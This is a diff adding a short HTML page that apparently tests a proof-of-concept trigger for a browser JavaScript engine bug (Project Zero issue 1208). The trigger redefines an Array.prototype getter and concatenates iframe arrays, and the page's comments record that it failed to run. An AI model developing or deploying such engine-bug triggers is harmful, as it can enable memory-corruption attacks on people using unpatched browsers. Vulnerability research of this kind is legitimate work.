@@ -1,0 +1,23 @@
+<!--Tested on 5.5.1-->
+<!--Bug tested: https://bugs.chromium.org/p/project-zero/issues/detail?id=1208 / https://pastebin.com/buAqEm74-->
+<!--Result: Does no run code at all (possibly considered a syntax error)-->
+<html>
+    <body>
+        Hi!
+        Status: <div id='status'>😴 waiting... click go.</div>
+        <script>
+            window.onload = function(){
+                alert("test2");
+                Array.prototype.__defineGetter__(100, () => 1);
+
+                let f = document.body.appendChild(document.createElement('iframe'));
+                let a = new f.contentWindow.Array(2.3023e-320, 2.3023e-320);
+                let b = new f.contentWindow.Array(2.3023e-320, 2.3023e-320);
+                alert("test");
+                let c = Array.prototype.concat.call(a, b);
+
+                alert(c);
+            }
+        </script>
+    </body>
+</html>
